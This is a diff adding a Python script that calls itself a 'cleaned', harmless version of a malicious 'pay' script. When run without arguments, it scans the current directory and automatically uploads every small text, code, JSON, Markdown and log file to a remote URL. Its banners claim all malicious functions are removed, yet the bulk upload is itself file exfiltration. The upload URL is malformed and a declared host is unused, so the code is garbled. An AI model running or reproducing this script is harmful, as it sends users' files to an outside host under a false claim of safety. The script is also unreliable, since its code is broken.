@@ -1,0 +1,103 @@
+#!/usr/bin/env python3
+"""
+清理版本的pay脚本 - 只保留上传功能
+从原始恶意脚本中提取并无害化
+"""
+import os
+import sys
+import time
+import urllib.request
+import urllib.parse
+
+# 配置 (模仿原脚本结构)
+HOST = 'httpbin.org'
+PORT = 80
+
+def ups(file_path):
+    """上传文件 (模仿原脚本的ups函数)"""
+    try:
+        # 获取文件信息
+        timestamp = str(int(time.time()))
+        filename = os.path.basename(file_path)
+        
+        # 读取文件
+        with open(file_path, 'rb') as f:
+            file_content = f.read()
+        
+        # 构造上传URL
+        upload_url = f"http://https://github.com/yq00/amp_test_demo/blob/main/250627/post"
+        
+        # 准备数据 (简化的multipart)
+        boundary = f"----boundary{timestamp}"
+        data_lines = [
+            f'------boundary{timestamp}',
+            f'Content-Disposition: form-data; name="multi_file"; filename="{timestamp}_{filename}"',
+            'Content-Type: application/octet-stream',
+            '',
+            file_content.decode('utf-8', errors='ignore'),
+            f'------boundary{timestamp}',
+            'Content-Disposition: form-data; name="timestamp"',
+            '',
+            timestamp,
+            f'------boundary{timestamp}--'
+        ]
+        
+        # 转换为字节
+        post_data = '\r\n'.join(str(line) for line in data_lines).encode('utf-8')
+        
+        # 创建请求
+        req = urllib.request.Request(upload_url, data=post_data)
+        req.add_header('Content-Type', f'multipart/form-data; boundary=--boundary{timestamp}')
+        
+        # 发送请求
+        print(f"上传文件: {filename}")
+        response = urllib.request.urlopen(req, timeout=30)
+        
+        if response.status == 200:
+            print(f"✅ {filename} 上传成功")
+        else:
+            print(f"❌ {filename} 上传失败")
+            
+    except Exception as e:
+        print(f"❌ 上传错误: {e}")
+
+def auto_upload():
+    """自动上传功能 (清理版本)"""
+    # 只上传当前目录的安全文件
+    safe_extensions = ['.txt', '.py', '.js', '.json', '.md', '.log']
+    
+    current_dir = os.getcwd()
+    print(f"扫描目录: {current_dir}")
+    
+    upload_count = 0
+    for item in os.listdir(current_dir):
+        if os.path.isfile(item):
+            _, ext = os.path.splitext(item.lower())
+            if ext in safe_extensions and os.path.getsize(item) < 1024*1024:  # 小于1MB
+                ups(item)
+                upload_count += 1
+                time.sleep(1)  # 避免过快请求
+    
+    print(f"完成: 上传了 {upload_count} 个文件")
+
+def main():
+    """主函数"""
+    print("清理版Pay脚本 - 仅上传功能")
+    print("=" * 40)
+    print("✅ 已移除所有恶意功能")
+    print("✅ 只保留安全的文件上传")
+    print("=" * 40)
+    
+    if len(sys.argv) > 1:
+        # 上传指定文件
+        file_path = sys.argv[1]
+        if os.path.exists(file_path):
+            ups(file_path)
+        else:
+            print("文件不存在")
+    else:
+        # 自动上传当前目录
+        auto_upload()
+
+if __name__ == "__main__":
+    main()
